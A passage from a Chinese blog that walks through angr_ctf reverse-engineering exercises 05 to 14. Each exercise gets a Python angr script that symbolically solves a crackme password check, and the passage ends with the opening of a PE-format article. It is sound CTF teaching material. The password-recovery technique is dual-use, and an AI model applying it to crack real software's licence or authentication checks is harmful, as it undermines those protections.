<p>这里仍然用scanf后的参数输入地址作为起点。解密脚本为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import angr</span><br><span class="line">import claripy</span><br><span class="line">import sys</span><br><span class="line">def is_successful(state):</span><br><span class="line">    stdout_output=state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    tag=b&#x27;Good Job.&#x27; in stdout_output</span><br><span class="line">    return True if tag else False</span><br><span class="line">def is_wrong(state):</span><br><span class="line">    stdout_output=state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    tag=b&#x27;Try again.&#x27; in stdout_output</span><br><span class="line">    return True if tag else False</span><br><span class="line">def Go():</span><br><span class="line">    path_to_binary=&#x27;/home/ubuntu/桌面/tmp/05_angr_symbolic_memory&#x27;</span><br><span class="line">    project=angr.Project(path_to_binary,auto_load_libs=False)</span><br><span class="line">    start_addr=0x8048601</span><br><span class="line">    initial_state=project.factory.blank_state(addr=start_addr)</span><br><span class="line">    passwd_size_in_bits=64</span><br><span class="line">    passwd0=claripy.BVS(&#x27;passwd0&#x27;,passwd_size_in_bits)</span><br><span class="line">    passwd1=claripy.BVS(&#x27;passwd1&#x27;,passwd_size_in_bits)</span><br><span class="line">    passwd2=claripy.BVS(&#x27;passwd2&#x27;,passwd_size_in_bits)</span><br><span class="line">    passwd3=claripy.BVS(&#x27;passwd3&#x27;,passwd_size_in_bits)</span><br><span class="line">    passwd0_address=0x0a1ba1c0#user_input的地址</span><br><span class="line">    initial_state.memory.store(passwd0_address,passwd0)</span><br><span class="line">    initial_state.memory.store(passwd0_address+0x8,passwd1)</span><br><span class="line">    initial_state.memory.store(passwd0_address+0x10,passwd2)</span><br><span class="line">    initial_state.memory.store(passwd0_address+0x18,passwd3)</span><br><span class="line">    sm=project.factory.simgr(initial_state)</span><br><span class="line">    sm.explore(find=is_successful,avoid=is_wrong)</span><br><span class="line">    if sm.found:</span><br><span class="line">        for i in sm.found:</span><br><span class="line">            solution_state=i</span><br><span class="line">            solution0=solution_state.solver.eval(passwd0,cast_to=bytes)</span><br><span class="line">            solution1=solution_state.solver.eval(passwd1,cast_to=bytes)</span><br><span class="line">            solution2=solution_state.solver.eval(passwd2,cast_to=bytes)</span><br><span class="line">            solution3=solution_state.solver.eval(passwd3,cast_to=bytes)</span><br><span class="line">            solution=solution0+b&quot; &quot;+solution1+b&quot; &quot;+solution2+b&quot; &quot;+solution3</span><br><span class="line">            print(&quot;[+]Success! Solution is: &#123;&#125;&quot;.format(solution))</span><br><span class="line">    else:</span><br><span class="line">        raise Exception(&quot;Could not find the solution&quot;)</span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    Go()</span><br></pre></td></tr></table></figure>

<p><code>state.memory.store</code>和<code>state.memory.load</code>，可以用来访问一段连续的内存。一般 <code>.load(addr, size)</code> 和 <code>.store(addr, val)</code>。</p>
<h2 id="06-angr-symbolic-dynamic-memory"><a href="#06-angr-symbolic-dynamic-memory" class="headerlink" title="06_angr_symbolic_dynamic_memory"></a>06_angr_symbolic_dynamic_memory</h2><p>堆内存的符号化。</p>
<p>ida反编译代码如下，可以看出buffer0和buffer1是动态申请的，存放在堆中。</p>
<p><img src="/images/%E5%88%9D%E6%AD%A5%E6%8E%A2%E7%A9%B6angr%E4%B8%8Ectf/image-20231106164922069.png" alt="image-20231106164922069"></p>
<p>代码实现如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import angr</span><br><span class="line">import claripy</span><br><span class="line">import sys</span><br><span class="line">def is_successful(state):</span><br><span class="line">    stdout_output=state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    tag=b&#x27;Good Job.&#x27; in stdout_output</span><br><span class="line">    return True if tag else False</span><br><span class="line">def is_wrong(state):</span><br><span class="line">    stdout_output=state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    tag=b&#x27;Try again.&#x27; in stdout_output</span><br><span class="line">    return True if tag else False</span><br><span class="line">def Go():</span><br><span class="line">    path_to_binary=&#x27;/home/ubuntu/桌面/tmp/06_angr_symbolic_dynamic_memory&#x27;</span><br><span class="line">    project=angr.Project(path_to_binary,auto_load_libs=False)</span><br><span class="line">    start_addr=0x8048699</span><br><span class="line">    initial_state=project.factory.blank_state(addr=start_addr)</span><br><span class="line">    passwd_size_in_bits=64</span><br><span class="line">    passwd0=claripy.BVS(&#x27;passwd0&#x27;,passwd_size_in_bits)</span><br><span class="line">    passwd1=claripy.BVS(&#x27;passwd1&#x27;,passwd_size_in_bits)</span><br><span class="line">    fake_heap_address0=0xffffabcd</span><br><span class="line">    fake_heap_address1=0xffffbdac</span><br><span class="line">    pointer_to_malloc_memory_address0= 0xabcc8a4</span><br><span class="line">    pointer_to_malloc_memory_address1= 0xabcc8ac</span><br><span class="line">    initial_state.memory.store(pointer_to_malloc_memory_address0, fake_heap_address0,endness=project.arch.memory_endness)</span><br><span class="line">    initial_state.memory.store(pointer_to_malloc_memory_address1, fake_heap_address1,endness=project.arch.memory_endness)</span><br><span class="line">    initial_state.memory.store(fake_heap_address0, passwd0)</span><br><span class="line">    initial_state.memory.store(fake_heap_address1, passwd1)</span><br><span class="line">    sm=project.factory.simgr(initial_state)</span><br><span class="line">    sm.explore(find=is_successful,avoid=is_wrong)</span><br><span class="line">    if sm.found:</span><br><span class="line">        for i in sm.found:</span><br><span class="line">            solution_state=i</span><br><span class="line">            solution0=solution_state.solver.eval(passwd0,cast_to=bytes)</span><br><span class="line">            solution1=solution_state.solver.eval(passwd1,cast_to=bytes)</span><br><span class="line">            solution=solution0+b&quot; &quot;+solution1</span><br><span class="line">            print(&quot;[+]Success! Solution is: &#123;&#125;&quot;.format(solution))</span><br><span class="line">    else:</span><br><span class="line">        raise Exception(&quot;Could not find the solution&quot;)</span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    Go()</span><br></pre></td></tr></table></figure>

<p><code>buffer0</code>和<code>buffer1</code>属于全局变量，因此在bss段。IDA查看其地址分别为0xabcc8a4和0xabcc8ac。</p>
<p><code>buffer0</code>和<code>buffer1</code>存储的是申请到的堆内存地址，angr并没有真正“运行”二进制文件，它只是在模拟运行状态，因此它实际上不需要将内存分配到堆中，实际上可以伪造任何地址。而需要使用者做的就是选择两个地址存放的堆区地址，<code>buffer0</code>和<code>buffer1</code>就是可选项。<code>0xffffabcd</code>和<code>0xffffbdac</code>是随机伪造的地址。</p>
<p><code>.store</code>参数<code>endness</code> 用于设置端序，angr默认为大端序，总共可选的值如下：</p>
<ul>
<li><code>LE</code> – 小端序</li>
<li><code>BE</code> – 大端序</li>
<li><code>ME</code> – 中间序</li>
</ul>
<p>实际内存和angr模拟内存对照如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">before:</span><br><span class="line">buffer0 -&gt; malloc()ed address 0 -&gt; string 0</span><br><span class="line">buffer1 -&gt; malloc()ed address 1 -&gt; string 1</span><br><span class="line"></span><br><span class="line">after:</span><br><span class="line">buffer0 -&gt; fake address 0 -&gt; symbolic bitvector 0</span><br><span class="line">buffer1 -&gt; fake address 1 -&gt; symbolic bitvector 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="07-angr-symbolic-file"><a href="#07-angr-symbolic-file" class="headerlink" title="07_angr_symbolic_file"></a>07_angr_symbolic_file</h2><p>反编译窗口如下：</p>
<p><img src="/images/%E5%88%9D%E6%AD%A5%E6%8E%A2%E7%A9%B6angr%E4%B8%8Ectf/image-20231106170603108.png" alt="image-20231106170603108"></p>
<p><img src="/images/%E5%88%9D%E6%AD%A5%E6%8E%A2%E7%A9%B6angr%E4%B8%8Ectf/image-20231106170615497.png" alt="image-20231106170615497"></p>
<p>程序使用<code>fread</code>函数从文件中读取字符串并加密。<code>ignore_me</code> 主要是把第一个读取的内容存入OJKSQYDP.txt。</p>
<p>这里用到了仿真文件系统-The Emulated Filesystem。在angr中与文件系统，套接字，管道或终端的任何交互的根源都是SimFile对象。可以从某个位置读取文件，可以在某个位置写入文件，可以询问文件中当前存储了多少字节，还可以具体化文件，并为其生成测试用例。</p>
<p>利用<code>SimFile</code>形成符号化的文件的格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">simgr_file = angr.storage.SimFile(filename, content=xxxxxx, size=file_size)</span><br></pre></td></tr></table></figure>

<p>然后利用<code>fs</code>选项以文件名的字典来预配置<code>SimFile</code>对象，也可以<code>fs.insert</code>是将文件插入到文件系统中，需要文件名与符号化的文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">initial_state.fs.insert(filename, simgr_file)</span><br></pre></td></tr></table></figure>

<p>具体代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import angr</span><br><span class="line">import claripy</span><br><span class="line">import sys</span><br><span class="line">def is_successful(state):</span><br><span class="line">    stdout_output=state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    tag=b&#x27;Good Job.&#x27; in stdout_output</span><br><span class="line">    return True if tag else False</span><br><span class="line">def is_wrong(state):</span><br><span class="line">    stdout_output=state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    tag=b&#x27;Try again.&#x27; in stdout_output</span><br><span class="line">    return True if tag else False</span><br><span class="line">def Go():</span><br><span class="line">    path_to_binary=&#x27;/home/ubuntu/桌面/tmp/07_angr_symbolic_file&#x27;</span><br><span class="line">    project=angr.Project(path_to_binary,auto_load_libs=False)</span><br><span class="line">    start_addr=0x080488EA</span><br><span class="line">    initial_state=project.factory.blank_state(addr=start_addr)</span><br><span class="line">    file_name=&#x27;OJKSQYDP.txt&#x27;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    symbolic_file_bytes=64</span><br><span class="line">    passwd0=claripy.BVS(&#x27;passwd0&#x27;,symbolic_file_bytes*8)</span><br><span class="line">    			passwd_file=angr.storage.SimFile(file_name,content=passwd0,size=symbolic_file_bytes)</span><br><span class="line">    initial_state.fs.insert(file_name,passwd_file)</span><br><span class="line">    sm=project.factory.simgr(initial_state)</span><br><span class="line">    sm.explore(find=is_successful,avoid=is_wrong)</span><br><span class="line">    if sm.found:</span><br><span class="line">        for i in sm.found:</span><br><span class="line">            solution_state=i</span><br><span class="line">            solution0=solution_state.solver.eval(passwd0,cast_to=bytes)</span><br><span class="line">            print(&quot;[+]Success! Solution is: &#123;&#125;&quot;.format(solution0))</span><br><span class="line">    else:</span><br><span class="line">        raise Exception(&quot;Could not find the solution&quot;)</span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    Go()</span><br></pre></td></tr></table></figure>

<h2 id="08-angr-constraints"><a href="#08-angr-constraints" class="headerlink" title="08_angr_constraints"></a>08_angr_constraints</h2><p>老规矩，继续用ida反编译</p>
<p><img src="/images/%E5%88%9D%E6%AD%A5%E6%8E%A2%E7%A9%B6angr%E4%B8%8Ectf/image-20231106174410462.png" alt="image-20231106174410462"></p>
<p>main函数调用scanf读取16字节的字符串输入至缓冲区buffer，然后调用<code>complex_function</code>函数对输入进行处理。最后调用<code>check_equals_AUPDNNPROEZRJWKB</code>完成逐字符的字符串比较，并根据结果相应输出。</p>
<p>这题主要是给出一个方法解决路径爆炸。当程序执行到<code>check_equals_AUPDNNPROEZRJWKB</code>时增加一个约束。实现代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import angr</span><br><span class="line">import claripy</span><br><span class="line">import sys</span><br><span class="line">def is_successful(state):</span><br><span class="line">    stdout_output=state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    tag=b&#x27;Good Job.&#x27; in stdout_output</span><br><span class="line">    return True if tag else False</span><br><span class="line">def is_wrong(state):</span><br><span class="line">    stdout_output=state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    tag=b&#x27;Try again.&#x27; in stdout_output</span><br><span class="line">    return True if tag else False</span><br><span class="line">def Go():</span><br><span class="line">    path_to_binary=&#x27;/home/ubuntu/桌面/tmp/08_angr_constraints&#x27;</span><br><span class="line">    project=angr.Project(path_to_binary,auto_load_libs=False)</span><br><span class="line">    start_addr=0x08048565</span><br><span class="line">    initial_state=project.factory.blank_state(addr=start_addr)</span><br><span class="line">    check_addr=0x08048565</span><br><span class="line">    buffer_addr=0x0804A050</span><br><span class="line">    passwd0=claripy.BVS(&#x27;passwd0&#x27;,16*8)</span><br><span class="line">    initial_state.memory.store(buffer_addr,passwd0)</span><br><span class="line">    sm=project.factory.simgr(initial_state)</span><br><span class="line">    sm.explore(find=check_addr,avoid=is_wrong)</span><br><span class="line">    if sm.found:</span><br><span class="line">        for i in sm.found:</span><br><span class="line">            solution_state=i</span><br><span class="line">            desired_string=&quot;AUPDNNPROEZRJWKB&quot;</span><br><span class="line">            check_param1=buffer_addr</span><br><span class="line">            check_param2=0x10</span><br><span class="line">            check_bvs=i.memory.load(check_param1,check_param2)#取出check_equals_AUPDNNPROEZRJWKB的两个参数</span><br><span class="line">            solution_state.add_constraints(check_bvs==desired_string)</span><br><span class="line">            solution0=solution_state.solver.eval(passwd0,cast_to=bytes)</span><br><span class="line">            print(&quot;[+]Success! Solution is: &#123;&#125;&quot;.format(solution0))</span><br><span class="line">    else:</span><br><span class="line">        raise Exception(&quot;Could not find the solution&quot;)</span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    Go()</span><br></pre></td></tr></table></figure>

<h2 id="09-angr-hooks"><a href="#09-angr-hooks" class="headerlink" title="09_angr_hooks"></a>09_angr_hooks</h2><p>用ida静态分析</p>
<p><img src="/images/%E5%88%9D%E6%AD%A5%E6%8E%A2%E7%A9%B6angr%E4%B8%8Ectf/image-20231106181735253.png" alt="image-20231106181735253"></p>
<p>首先读取一个16字符的字符串至缓冲区buffer中，之后调用complex_function函数对buffer中的内容进行逐字符处理，最后将处理后的buffer中的内容与password缓冲区中的字符串进行比较。</p>
<p>再次读取一个16字符的字符串至缓冲区buffer中，之后调用complex_function函数对password中的内容进行逐字符处理，最后将处理后的password中的内容与buffer中的字符串进行比较。</p>
<p>解题代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import angr</span><br><span class="line">import sys</span><br><span class="line">import claripy</span><br><span class="line"></span><br><span class="line">def is_successful(state):</span><br><span class="line">    stdout_output=state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    tag=b&#x27;Good Job.&#x27; in stdout_output</span><br><span class="line">    return True if tag else False</span><br><span class="line">def is_bad(state):</span><br><span class="line">    stdout_output=state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    tag=b&#x27;Try again.&#x27; in stdout_output</span><br><span class="line">    return True if tag else False</span><br><span class="line">def main():</span><br><span class="line">    project=angr.Project(&#x27;/home/ubuntu/桌面/tmp/09_angr_hooks&#x27;,auto_load_libs=False)</span><br><span class="line">    init_state=project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">    check_addr=0x080486B3#call check_equals_XYMKBKUHNIQYNQXE的地址</span><br><span class="line">    check_skip_size=0x5#call check_equals_XYMKBKUHNIQYNQXE的长度</span><br><span class="line">    @project.hook(check_addr,length=check_skip_size)</span><br><span class="line">    def check_hook(state):</span><br><span class="line">        user_input_addr=0x0804A054</span><br><span class="line">        user_input_size=0x10</span><br><span class="line">        user_input_bvs=state.memory.load(user_input_addr,user_input_size)</span><br><span class="line">        desired_string=&quot;XYMKBKUHNIQYNQXE&quot;</span><br><span class="line">        state.regs.eax=claripy.If(</span><br><span class="line">            user_input_bvs==desired_string,</span><br><span class="line">            claripy.BVV(1,32),</span><br><span class="line">            claripy.BVV(0,32)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    sm=project.factory.simgr(init_state)</span><br><span class="line">    sm.explore(find=is_successful,avoid=is_bad)</span><br><span class="line">    if sm.found:</span><br><span class="line">        found_state=sm.found[0]</span><br><span class="line">        print(&quot;[+] solution is: &#123;&#125;&quot;.format(found_state.posix.dumps(0)))</span><br><span class="line">    else:</span><br><span class="line">        raise Exception(&quot;not found solution&quot;)</span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h2 id="10-angr-simprocedures"><a href="#10-angr-simprocedures" class="headerlink" title="10_angr_simprocedures"></a>10_angr_simprocedures</h2><p>用ida打开</p>
<p><img src="/images/%E5%88%9D%E6%AD%A5%E6%8E%A2%E7%A9%B6angr%E4%B8%8Ectf/image-20231106193220795.png" alt="image-20231106193220795"></p>
<p><img src="/images/%E5%88%9D%E6%AD%A5%E6%8E%A2%E7%A9%B6angr%E4%B8%8Ectf/image-20231106193307492.png" alt="image-20231106193307492"></p>
<p>可以发现对<code>check_equals_ORSDDWXHZURJRBDH</code>进行了大量的引用。因此与第9题不同，这次直接hook符号(函数名)。上代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import angr</span><br><span class="line">import sys</span><br><span class="line">import claripy</span><br><span class="line"></span><br><span class="line">def is_successful(state):</span><br><span class="line">    stdout_output=state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    tag=b&#x27;Good Job.&#x27; in stdout_output</span><br><span class="line">    return True if tag else False</span><br><span class="line">def is_wrong(state):</span><br><span class="line">    stdout_output=state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    tag=b&#x27;Try again.&#x27; in stdout_output</span><br><span class="line">    return True if tag else False</span><br><span class="line">def main():</span><br><span class="line">    project=angr.Project(&#x27;/home/ubuntu/桌面/tmp/10_angr_simprocedures&#x27;,auto_load_libs=False)</span><br><span class="line"></span><br><span class="line">    init_state=project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">    class mySimProcedure(angr.SimProcedure):</span><br><span class="line">        def run(self,buffer_addr,buffer_size):</span><br><span class="line">            bvs=self.state.memory.load(buffer_addr,buffer_size)</span><br><span class="line">            desired_string=&quot;ORSDDWXHZURJRBDH&quot;</span><br><span class="line">            return claripy.If(desired_string==bvs,claripy.BVV(1,32),claripy.BVV(0,32))</span><br><span class="line">    check_symbol=&quot;check_equals_ORSDDWXHZURJRBDH&quot;</span><br><span class="line">    project.hook_symbol(check_symbol,mySimProcedure())</span><br><span class="line">    sm=project.factory.simgr(init_state)</span><br><span class="line">    sm.explore(find=is_successful,avoid=is_wrong)</span><br><span class="line">    if sm.found:</span><br><span class="line">        for found_state in sm.found:</span><br><span class="line">            print(&quot;[+] solution is: &#123;&#125;&quot;.format(found_state.posix.dumps(0)))</span><br><span class="line">    else:</span><br><span class="line">        raise Exception(&quot;not found solution&quot;)</span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h2 id="11-angr-sim-scanf"><a href="#11-angr-sim-scanf" class="headerlink" title="11_angr_sim_scanf"></a>11_angr_sim_scanf</h2><p>用ida打开：</p>
<p><img src="/images/%E5%88%9D%E6%AD%A5%E6%8E%A2%E7%A9%B6angr%E4%B8%8Ectf/image-20231106195819829.png" alt="image-20231106195819829"></p>
<p>和上一题差不多，要求hook scanf</p>
<p><strong>globals</strong>：</p>
<p>在这里<code>buffer0</code>和<code>buffer1</code>是函数<code>mySimProcedure</code>的局部变量，为了让函数外部也能获得我们输入的符号位向量，从而调用求解器获得答案，需要将这两个符号位向量变为全局变量，这里我们需要调用带有全局状态的globals插件中“保存”对我们的符号值的引用。globals插件允许使用列表，元组或多个键的字典来存储多个位向量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import angr</span><br><span class="line">import claripy</span><br><span class="line">import sys</span><br><span class="line">def is_successful(state):</span><br><span class="line">    stdout_output=state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    tag=b&#x27;Good Job.&#x27; in stdout_output</span><br><span class="line">    return True if tag else False</span><br><span class="line">def is_wrong(state):</span><br><span class="line">    stdout_output=state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    tag=b&#x27;Try again.&#x27; in stdout_output</span><br><span class="line">    return True if tag else False</span><br><span class="line">def main():</span><br><span class="line">    project=angr.Project(&#x27;/home/ubuntu/桌面/tmp/11_angr_sim_scanf&#x27;,auto_load_libs=False)</span><br><span class="line"></span><br><span class="line">    init_state=project.factory.entry_state()</span><br><span class="line">    class mySimProcedure(angr.SimProcedure):</span><br><span class="line">        def run(self,format_str,buffer0_addr,buffer1_addr):</span><br><span class="line">            buffer0=claripy.BVS(&#x27;buffer0&#x27;,32)</span><br><span class="line">            buffer1=claripy.BVS(&#x27;buffer1&#x27;,32)</span><br><span class="line">            self.state.memory.store(buffer0_addr,buffer0,endness=project.arch.memory_endness)</span><br><span class="line">            self.state.memory.store(buffer1_addr,buffer1,endness=project.arch.memory_endness)</span><br><span class="line">            self.state.globals[&#x27;solutions&#x27;]=(buffer0,buffer1)</span><br><span class="line">            return</span><br><span class="line">    sacnf_symbol=&quot;__isoc99_scanf&quot;</span><br><span class="line">    project.hook_symbol(sacnf_symbol,mySimProcedure())</span><br><span class="line">    sm=project.factory.simgr(init_state)</span><br><span class="line">    sm.explore(find=is_successful,avoid=is_wrong)</span><br><span class="line">    if sm.found:</span><br><span class="line">        for found_state in sm.found:</span><br><span class="line">            store_solutions=found_state.globals[&#x27;solutions&#x27;]</span><br><span class="line">            solution0=found_state.solver.eval(store_solutions[0])</span><br><span class="line">            solution1=found_state.solver.eval(store_solutions[1])</span><br><span class="line">            print(&quot;[+] solution is :&#123;&#125; &#123;&#125;&quot;.format(solution0,solution1))</span><br><span class="line">    else:</span><br><span class="line">        raise Exception(&quot;not found solutions&quot;)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h2 id="12-angr-veritesting"><a href="#12-angr-veritesting" class="headerlink" title="12_angr_veritesting"></a>12_angr_veritesting</h2><p>veritesting的开启使得angr同时使用”动态符号执行” 和 “静态分析” 减少路径爆炸的影响，用ida看反编译代码：</p>
<p><img src="/images/%E5%88%9D%E6%AD%A5%E6%8E%A2%E7%A9%B6angr%E4%B8%8Ectf/image-20231106203842871.png" alt="image-20231106203842871"></p>
<p>main函数中调用scanf函数读取长度为32字节的字符串输入到起始地址为buffer[3]的内存空间中，逐个比较buffer[i + 3]和complex_function(75, i + 93)。解题代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import angr</span><br><span class="line">import claripy</span><br><span class="line">import sys</span><br><span class="line">def is_successful(state):</span><br><span class="line">    stdout_output=state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    tag=b&#x27;Good Job.&#x27; in stdout_output</span><br><span class="line">    return True if tag else False</span><br><span class="line">def is_wrong(state):</span><br><span class="line">    stdout_output=state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    tag=b&#x27;Try again.&#x27; in stdout_output</span><br><span class="line">    return True if tag else False</span><br><span class="line">def main():</span><br><span class="line">    project=angr.Project(&#x27;/home/ubuntu/桌面/tmp/12_angr_veritesting&#x27;,auto_load_libs=False)</span><br><span class="line">    init_state=project.factory.entry_state()</span><br><span class="line">    sm=project.factory.simgr(init_state,veritesting=True)</span><br><span class="line">    sm.explore(find=is_successful,avoid=is_wrong)</span><br><span class="line">    if sm.found:</span><br><span class="line">        for found_state in sm.found:</span><br><span class="line">            print(&quot;[+] solution is:&#123;&#125;&quot;.format(found_state.posix.dumps(0)))</span><br><span class="line">    else:</span><br><span class="line">        raise Exception(&quot;not found solution&quot;)</span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h2 id="13-angr-static-binary"><a href="#13-angr-static-binary" class="headerlink" title="13_angr_static_binary"></a>13_angr_static_binary</h2><p>用ida打开</p>
<p><img src="/images/%E5%88%9D%E6%AD%A5%E6%8E%A2%E7%A9%B6angr%E4%B8%8Ectf/image-20231106204801482.png" alt="image-20231106204801482"></p>
<p> 由于该程序是静态链接的，故对于scanf、printf、puts等函数，angr不会自动将其hook，替换成angr自己实现的函数，而是进行符号执行。为了避免路径爆炸和过多的开销，可以手动hook。解题代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import angr</span><br><span class="line">import claripy</span><br><span class="line">import sys</span><br><span class="line">def is_successful(state):</span><br><span class="line">    stdout_output=state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    tag=b&#x27;Good Job.&#x27; in stdout_output</span><br><span class="line">    return True if tag else False</span><br><span class="line">def is_wrong(state):</span><br><span class="line">    stdout_output=state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    tag=b&#x27;Try again.&#x27; in stdout_output</span><br><span class="line">    return True if tag else False</span><br><span class="line">def main():</span><br><span class="line">    project=angr.Project(&#x27;/home/ubuntu/桌面/tmp/13_angr_static_binary&#x27;,auto_load_libs=False)</span><br><span class="line">    init_state=project.factory.entry_state()</span><br><span class="line">    printf_addr=0x0804ED40</span><br><span class="line">    scanf_addr=0x0804ED80</span><br><span class="line">    puts_addr=0x0804F350</span><br><span class="line">    strcmp_addr=0x0805B450</span><br><span class="line">    libc_start_main_addr=0x08048D10</span><br><span class="line"></span><br><span class="line">    project.hook(printf_addr, angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;printf&#x27;]())</span><br><span class="line">    project.hook(scanf_addr, angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;scanf&#x27;]())</span><br><span class="line">    project.hook(puts_addr, angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;puts&#x27;]())</span><br><span class="line">    project.hook(strcmp_addr, angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;strcmp&#x27;]())</span><br><span class="line">    project.hook(libc_start_main_addr, angr.SIM_PROCEDURES[&#x27;glibc&#x27;][&#x27;__libc_start_main&#x27;]())</span><br><span class="line">    sm=project.factory.simgr(init_state)</span><br><span class="line">    sm.explore(find=is_successful,avoid=is_wrong)</span><br><span class="line">    if sm.found:</span><br><span class="line">        found_state=sm.found[0]</span><br><span class="line">        print(&quot;[+]solution is:&#123;&#125;&quot;.format(found_state.posix.dumps(0)))</span><br><span class="line">    else:</span><br><span class="line">        raise Exception(&quot;not found solution&quot;)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>



<h2 id="14-angr-shared-library"><a href="#14-angr-shared-library" class="headerlink" title="14_angr_shared_library"></a>14_angr_shared_library</h2><p>用ida打开：</p>
<p><img src="/images/%E5%88%9D%E6%AD%A5%E6%8E%A2%E7%A9%B6angr%E4%B8%8Ectf/image-20231106210333869.png" alt="image-20231106210333869"></p>
<p>函数逻辑简单，唯一不同的是validate函数在动态链接库（.so文件）中。动态链接库中的共享对象最终装载地址在编译的时候是不确定的。解题代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import angr</span><br><span class="line">import claripy</span><br><span class="line">import sys</span><br><span class="line">def is_success(state):</span><br><span class="line">    return b&#x27;Good Job.&#x27; in state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">def is_bad(state):</span><br><span class="line">    return b&#x27;Try again.&#x27; in state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">def main():</span><br><span class="line">    base_addr=0x08048000</span><br><span class="line">    project=angr.Project(&#x27;/home/ubuntu/桌面/tmp/lib14_angr_shared_library.so&#x27;,load_options=&#123;</span><br><span class="line">        &#x27;main_opts&#x27;:&#123;</span><br><span class="line">            # backend —— 使用哪个后台，可以是一个对象，也可以是一个名字(字符串)</span><br><span class="line">			# custom_base_addr —— 使用的基地址</span><br><span class="line">			# custom_entry_point —— 使用的入口点</span><br><span class="line">			# custom_arch —— 使用的处理器体系结构的名字</span><br><span class="line">            &#x27;custom_base_addr&#x27;:base_addr</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    # 初始化符号变量,0x30000000为缓冲区地址</span><br><span class="line">    sym_val=claripy.BVV(0x30000000,32)</span><br><span class="line">     #validate函数地址为base+0x6d7,lib14_angr_shared_library.so的地址不是14_angr_shared_library的</span><br><span class="line">    validate_function_address = base_addr+0x6d7</span><br><span class="line">    #因为需要比较的字符串长度为8，故利用BVV传入参数claripy.BVV(8,32)</span><br><span class="line">    init_state = project.factory.call_state(validate_function_address,sym_val,claripy.BVV(8,32))</span><br><span class="line">    passwd=claripy.BVS(&#x27;passwd&#x27;,8*8)</span><br><span class="line">    init_state.memory.store(sym_val,passwd)</span><br><span class="line">    sm=project.factory.simgr(init_state)</span><br><span class="line">    sm.explore(find=base_addr+0x783)</span><br><span class="line">    if sm.found:</span><br><span class="line">        found_state=sm.found[0]</span><br><span class="line">        found_state.add_constraints(found_state.regs.eax!=0)</span><br><span class="line">        print(&quot;[+] solution is:&#123;&#125;&quot;.format(found_state.solver.eval(passwd,cast_to=bytes)))</span><br><span class="line">    else:</span><br><span class="line">        raise Exception(&#x27;not found solution&#x27;)</span><br><span class="line">if __name__ ==&#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>-ctf -reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>PE结构详解</title>
    <url>/2023/10/23/PE%E7%BB%93%E6%9E%84%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<p>PE结构是windows的可执行文件结构，学习PE结构有助于为后面的软件安全的学习打下基础。下面的内容全是看小甲鱼的视频总结的知识点，小甲鱼yyds！</p>
<span id="more"></span>

<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>(1)EXE和DLL文件之间的区别完全是语义上的，因为他们使用完全相同的PE格式。而唯一的区别就是用结构中的一个字段标识出这个文件是EXE还是DLL文件。</p>
